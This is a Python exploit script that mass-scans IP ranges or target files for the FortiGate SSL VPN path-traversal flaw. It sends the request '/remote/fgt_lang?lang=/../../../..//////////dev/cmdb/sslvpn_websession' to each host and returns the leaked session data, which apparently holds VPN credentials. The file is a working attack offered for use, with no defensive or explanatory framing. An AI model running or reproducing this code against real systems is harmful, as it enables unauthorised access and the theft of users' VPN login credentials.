import time
import requests
from Utilization.format_target import Format


def CheckIP(ip):
    try:
        url = "https://" + ip + "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
        headers = {"User-Agent": "Mozilla/5.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        r = requests.get(url, headers=headers, verify=False, stream=True, timeout=2)
        img = r.raw.read()
        if "var fgt_lang =" in str(img):
            ret = ''.join(set(str(img).split("x00")))
            time.sleep(2)
            return ret
        else:
            time.sleep(2)
            return "No Vulnerability"
    except:
        time.sleep(2)
        return "Timeout"


def Exploit(target):
    result=[]
    for item in target:
        ip=item[0]+':'+str(item[1])
        ret=CheckIP(ip)
        result.append([ip,ret])
    return result


if __name__ == '__main__':
    test = Format()
    print(Exploit(test.format_ip('192.168.1.1/30')))
    # print(Exploit(test.format_file('ip.txt')))
